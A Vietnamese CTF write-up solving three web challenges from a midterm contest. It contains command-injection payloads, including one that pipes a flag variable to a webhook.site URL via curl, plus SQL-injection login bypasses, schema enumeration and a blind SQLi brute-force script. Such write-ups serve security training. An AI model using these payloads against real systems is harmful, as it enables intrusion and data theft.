# midterm-test-W1-writeup

## [Web] HEAD1

### Challenge
> [http://45.122.249.68:20018/](http://45.122.249.68:20018/)<br/>
> [Attachment](https://cnsc.uit.edu.vn/ctf/files/8f80fff2c153912fc5322388b2b69332/head1.zip?token=eyJ1c2VyX2lkIjo2MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwNn0.ZLyUUw.qKuUDVqRmiQZwgtJUrvXOP3X2ZQ)

### Solution
```php
<?php

if (strpos($_SERVER['REQUEST_URI'], '_')) {
    die("no no no");
}

if (isset($_GET['input_data'])) {
    $output = shell_exec("curl --head " . $_POST['input_data']);
    echo $output;
}

show_source(__FILE__);
```
- Ở bài này source code khá đơn giản đầu tiên là mình phải bypass được ký tự `_` trong `input_data`, thì ở đây đơn giản ta chỉ cần **URL encode** ký tự `_` sẽ bypass được điều kiện đầu tiên.
- Sang với điều kiện thứ 2, trong đầu mình đặt ra 1 câu hỏi là làm sao có thể truyền cùng lúc data cho `$_GET` và `$_POST`, giải pháp là ta sẽ sử dụng lệnh `curl` với option `-d` hoặc có thể gửi trực tiếp request thông qua `BurpSuite`

![](2023-07-23-10-06-39.png)
- Câu lệnh hoàn chỉnh như sau: `curl -d input_data=%3Bls%20%2F http://45.122.249.68:20018/\?input%5fdata\=`
- Request sẽ được gửi dưới dạng như sau
```http
POST /?input%5fdata= HTTP/1.1
Host: 45.122.249.68:20018
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 22
Content-Type: application/x-www-form-urlencoded

input_data=%3Bls%20%2F
```
- Kết quả nhận được là
![](2023-07-23-10-14-34.png)

```
Flag: W1{ez_head1_huh}
```

## [Web] HEAD2

### Challenge
> [http://45.122.249.68:20019/](http://45.122.249.68:20019/)<br/>
> [Attachment](https://cnsc.uit.edu.vn/ctf/files/a6750a769d391094b4fa05b349cea45e/head2.zip?token=eyJ1c2VyX2lkIjo2MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwNH0.ZLyglw.YagF13lszTqadAdn95aq2a9FKK8)

### Solution
```php
<?php

if (isset($_GET['input_data'])) {
    $output = shell_exec("curl --head " . $_GET['input_data']);
    // echo $output;
}

show_source(__FILE__);
```
- Ở bài này thì ta truyền vào được `OS Command` nhưng câu hỏi đặt ra là *Làm sao để đọc được kết quả ra đây?*
- Thì ở đây đầu tiên ta kiểm tra thấy sever không chặn kết nối ra ngoài, vậy nên giải pháp ở đây sẽ là đọc file và gửi nó ra ngoài Internet và bắt lại là xong.
- Payload: `; echo $FLAG | curl https://webhook.site/bb145fec-1626-4da3-b695-7cc86b11e295 --data-binary @-;`

```
Flag: W1{webhook_not_so_bad_huh?}
```

## [Web] DEJAVU

### Challenge
> Bài này quen quen 🐳 <br/>
> [http://45.122.249.68:20017/](http://45.122.249.68:20017/)<br/>
> [Attachment](https://cnsc.uit.edu.vn/ctf/files/e68f2b74721ee7ce9863f1b983508161/dejavu.zip?token=eyJ1c2VyX2lkIjo2MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwM30.ZLykUA.6cORsdHqk08qta_RVa7jUtuBp2s)

### Solution
- Bài này khá tương tự với 1 bài đã giải trong traning, cơ bản **flag** gồm 3 phần nằm hết ở database.
![](2023-07-23-10-56-15.png)
- Sơ qua về trang web thì ở trang `index.php` sẽ cung cấp cho ta 1 form login và qua file `login.php` khi ta đăng nhập thành công sever sẽ redirect qua `/news.php`. Ở dòng 13 ta có thể thực hiện SQL Injection để bypass qua phần login.
![](2023-07-23-10-58-50.png)
- Có 1 chú ý là ở file `news.php`, sever sẽ kiểm tra xem `$_SESSION['username']` của chúng ta có phải là `admin` hay không nên payload để SQLi phần login sẽ như sau:
    - `username`: `admin`
    - `password`: `' UNION SELECT username,password FROM users WHERE username='admin`
- Ở `/news.php` có 1 đoạn code khá *nhạy cảm* giúp chúng ta có thể truyền vào biến `$_GET['name']` qua đó có thể đọc nội dung từ database.
![](2023-07-23-11-04-09.png)
- Payload cho **Part 1**: `' UNION SELECT flag, flag FROM secret -- `
![](2023-07-23-11-07-36.png)
- Ở **Part 2** thì flag nằm trong 1 bảng ta chưa biết tên nên ta có thể sử dụng payload `' UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS -- ` để in ra thông tin bao gồm tên các bảng và cột.
![](2023-07-23-11-09-50.png)
- Payload cho **Part 2**: `' UNION SELECT flag_5959595959408498_5959595959408498, flag_5959595959408498_5959595959408498 FROM secret_8489498498112318_8489498498112318 -- `
![](2023-07-23-11-10-34.png)
- Ở **Part 3** thì flag là mật khẩu của tài khoản `admin`, ở đây có 2 cách để khai thác đều là `bruteforce`.
    - **Cách 1**: Xoá cookie đang có để reset `$_SESSION` rồi bruteforce password từ trang `login.php`. Script bruteforce như sau:
```py
import requests
import string

# charset = string.ascii_letters + string.digits + string.punctuation
charset = [chr(i) for i in range(1100,2000)]

url = "http://45.122.249.68:20017/login.php"
flag = "_part"
pos = 6

while True:
    for char in charset:
        data = {
            "username": f"admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), {pos}, 1) = '{char}' --  ",
            "password": "abc"
        }
        r = requests.post(url, data=data)
        print("Đang test ký tự:", char, end='\r')
        if r.url == "http://45.122.249.68:20017/news.php":
            pos += 1
            flag += char
            print()
            print("Part 3:", flag)
            break
    else:
        continue

```
